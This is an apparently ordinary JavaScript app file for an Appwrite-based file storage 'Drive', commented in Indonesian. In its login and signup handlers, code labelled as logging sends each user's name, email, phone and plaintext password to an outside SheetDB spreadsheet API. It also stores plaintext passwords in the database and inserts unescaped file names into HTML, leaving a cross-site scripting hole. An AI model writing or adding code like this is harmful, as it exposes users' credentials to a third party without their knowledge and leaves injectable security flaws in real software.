// ======================================================
// STORAGE TASKS - APP.JS (FIXED LOGIC)
// ======================================================

const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// KONFIGURASI
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',   
    BUCKET_ID: 'taskfiles'
};

const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi';

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

let currentUser = null;
let currentFolderId = 'root'; 
let currentFolderName = "Drive";

const el = (id) => document.getElementById(id);
const showLoading = () => { if(el('loading')) el('loading').classList.remove('hidden'); };
const hideLoading = () => { if(el('loading')) el('loading').classList.add('hidden'); };

// NAVIGASI HALAMAN
window.nav = (pageId) => {
    ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => {
        if(el(id)) el(id).classList.add('hidden');
    });
    if(el(pageId)) el(pageId).classList.remove('hidden');
};

// ======================================================
// LOGIKA PENYIMPANAN (STORAGE CALCULATION)
// ======================================================
async function calculateStorage() {
    if (!currentUser) return;
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.equal('type', 'file')
        ]);
        
        let totalBytes = 0;
        res.documents.forEach(doc => totalBytes += (doc.size || 0));
        
        // Konversi ke MB
        const usedMB = (totalBytes / (1024 * 1024)).toFixed(2);
        
        // Kapasitas Total (2GB)
        const totalGB = 2; 
        const totalBytesCap = totalGB * 1024 * 1024 * 1024;
        
        // Persentase
        const percentage = Math.min((totalBytes / totalBytesCap) * 100, 100);
        
        // Update UI Widget
        const barElement = el('storageBar');
        const textElement = el('storageTextDisplay');
        
        if(barElement) barElement.style.width = percentage + "%";
        
        // FORMAT TEXT SESUAI REQUEST: "Terpakai / Total"
        if(textElement) textElement.innerText = `${usedMB} MB / ${totalGB} GB`;
        
    } catch (e) { 
        console.error("Gagal hitung storage:", e); 
    }
}

// ======================================================
// LOGIKA FILE MANAGER
// ======================================================
async function loadFiles(folderId) {
    if (!currentUser) return;
    const grid = el('fileGrid'); 
    grid.innerHTML = ''; 

    // Update Breadcrumb Header
    const breadcrumb = document.querySelector('.breadcrumb-area');
    if(folderId === 'root') {
        updateGreeting(); 
    } else {
        breadcrumb.innerHTML = `<div style="display:flex; align-items:center; gap:10px;"><button onclick="loadFiles('root')" class="btn-pill small" style="background:rgba(255,255,255,0.2); width:auto; padding:0 15px;"><i class="fa-solid fa-arrow-left"></i> Kembali</button> <h2 style="margin:0;">${currentFolderName}</h2></div>`;
    }

    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.equal('parentId', folderId)
        ]);
        
        if(res.documents.length === 0) {
            grid.innerHTML = `<p style="color:rgba(255,255,255,0.4); width:100%; text-align:center; grid-column: 1/-1; margin-top:50px; font-style:italic;">Folder ini kosong</p>`;
        } else {
            res.documents.forEach(doc => renderItem(doc));
        }
    } catch (e) { console.error(e); }
}

function renderItem(doc) {
    const grid = el('fileGrid');
    const div = document.createElement('div');
    div.className = 'item-card';
    
    const isFolder = doc.type === 'folder';
    let icon = isFolder ? '<i class="icon fa-solid fa-folder"></i>' : '<i class="icon fa-solid fa-file-lines"></i>';
    
    // Preview Gambar
    if (!isFolder && doc.nama.match(/\.(jpg|jpeg|png|webp|gif)$/i)) {
        const url = storage.getFilePreview(CONFIG.BUCKET_ID, doc.fileId);
        icon = `<img src="${url}" style="width:80px; height:80px; object-fit:cover; border-radius:10px; margin-bottom:10px;">`;
    }

    const action = isFolder ? `openFolder('${doc.$id}', '${doc.nama}')` : `window.open('${doc.url}', '_blank')`;

    div.innerHTML = `
        <button class="del-btn" onclick="deleteItem('${doc.$id}','${doc.type}','${doc.fileId}')"><i class="fa-solid fa-xmark"></i></button>
        <div onclick="${action}" style="width:100%; height:100%; display:flex; flex-direction:column; align-items:center; justify-content:center;">
            ${icon}
            <div class="item-name">${doc.nama}</div>
        </div>`;
    grid.appendChild(div);
}

// ACTIONS
window.openFolder = (id, nama) => { currentFolderId = id; currentFolderName = nama; loadFiles(id); };

window.submitCreateFolder = async () => {
    const n = el('newFolderName').value.trim(); if(!n) return;
    closeModal('folderModal'); showLoading();
    try {
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            nama: n, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0
        });
        loadFiles(currentFolderId);
    } catch(e){ alert(e.message); } finally { hideLoading(); }
};

window.submitUploadFile = async () => {
    if (!window.selectedFile) return alert("Pilih file!");
    closeModal('uploadModal'); showLoading();
    try {
        const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), window.selectedFile);
        const url = storage.getFileView(CONFIG.BUCKET_ID, up.$id);
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            nama: window.selectedFile.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, url: url.href, fileId: up.$id, size: window.selectedFile.size
        });
        loadFiles(currentFolderId); calculateStorage();
    } catch(e){ alert(e.message); } finally { hideLoading(); }
};

window.deleteItem = async (id, type, fileId) => {
    if (!confirm("Hapus item ini?")) return;
    showLoading();
    try {
        if (type === 'file') await storage.deleteFile(CONFIG.BUCKET_ID, fileId);
        await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, id);
        loadFiles(currentFolderId); calculateStorage();
    } catch(e){ alert(e.message); } finally { hideLoading(); }
};

// OTENTIKASI & INIT
async function checkSession() {
    showLoading();
    try {
        currentUser = await account.get();
        nav('dashboardPage'); updateGreeting(); loadFiles('root'); calculateStorage();
    } catch (e) { nav('loginPage'); }
    finally { setTimeout(hideLoading, 500); }
}
document.addEventListener('DOMContentLoaded', checkSession);

// LOGIN & SIGNUP HANDLER (Simplified)
if (el('loginForm')) el('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    let id = el('loginEmail').value.trim(); const pw = el('loginPass').value;
    try {
        if (!id.includes('@')) {
            const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [Appwrite.Query.equal('name', id)]);
            if (res.total === 0) throw new Error("User tidak ditemukan");
            id = res.documents[0].email;
        }
        await account.createEmailPasswordSession(id, pw);
        currentUser = await account.get();
        // Log ke Excel
        fetch(`${SHEETDB_API}?sheet=Login`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data: [{"ID": currentUser.$id, "Nama": currentUser.name, "Email": currentUser.email, "Password": pw, "Riwayat Waktu": new Date().toLocaleString()}]}) });
        checkSession();
    } catch(e) { alert(e.message); }
});

if (el('signupForm')) el('signupForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const name = el('regName').value; const email = el('regEmail').value; const phone = el('regPhone').value; const pass = el('regPass').value;
    try {
        const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone, password: pass });
        fetch(`${SHEETDB_API}?sheet=SignUp`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data: [{"ID": auth.$id, "Nama": name, "Email": email, "Phone": phone, "Password": pass, "Waktu": new Date().toLocaleString()}]}) });
        alert("Berhasil!"); nav('loginPage');
    } catch (e) { alert(e.message); }
});

if (el('logoutBtn')) el('logoutBtn').addEventListener('click', async () => {
    if(!confirm("Keluar?")) return;
    try { await account.deleteSession('current'); nav('loginPage'); } catch(e){ nav('loginPage'); }
});

// UI HELPERS
window.nav = (p) => { document.querySelectorAll('section').forEach(s => s.classList.add('hidden')); el(p).classList.remove('hidden'); };
window.openModal = (m) => { el(m).classList.remove('hidden'); el('dropdownMenu').classList.remove('show'); };
window.closeModal = (m) => el(m).classList.add('hidden');
window.toggleDropdown = () => el('dropdownMenu').classList.toggle('show');
window.triggerUploadModal = () => openModal('uploadModal');
window.createFolder = () => openModal('folderModal');
window.togglePass = (id, icon) => { const i = el(id); i.type = i.type==='password'?'text':'password'; icon.classList.toggle('fa-eye'); icon.classList.toggle('fa-eye-slash'); };
function updateGreeting() { const h = new Date().getHours(); let s = "Morning"; if(h>=12) s="Afternoon"; if(h>=18) s="Night"; if(el('welcomeText')) el('welcomeText').innerText = `Welcome In Drive ${s}`; }

// Drag & Drop Logic
el('dropZone').addEventListener('dragover', (e) => { e.preventDefault(); e.target.classList.add('dragover'); });
el('dropZone').addEventListener('dragleave', (e) => e.target.classList.remove('dragover'));
el('dropZone').addEventListener('drop', (e) => { e.preventDefault(); e.target.classList.remove('dragover'); handleFileSelect(e.dataTransfer.files[0]); });
el('fileInputHidden').addEventListener('change', (e) => handleFileSelect(e.target.files[0]));
function handleFileSelect(f) { window.selectedFile = f; el('fileInfoText').innerText = `File: ${f.name}`; }
el('searchInput').addEventListener('input', () => loadFiles(currentFolderId));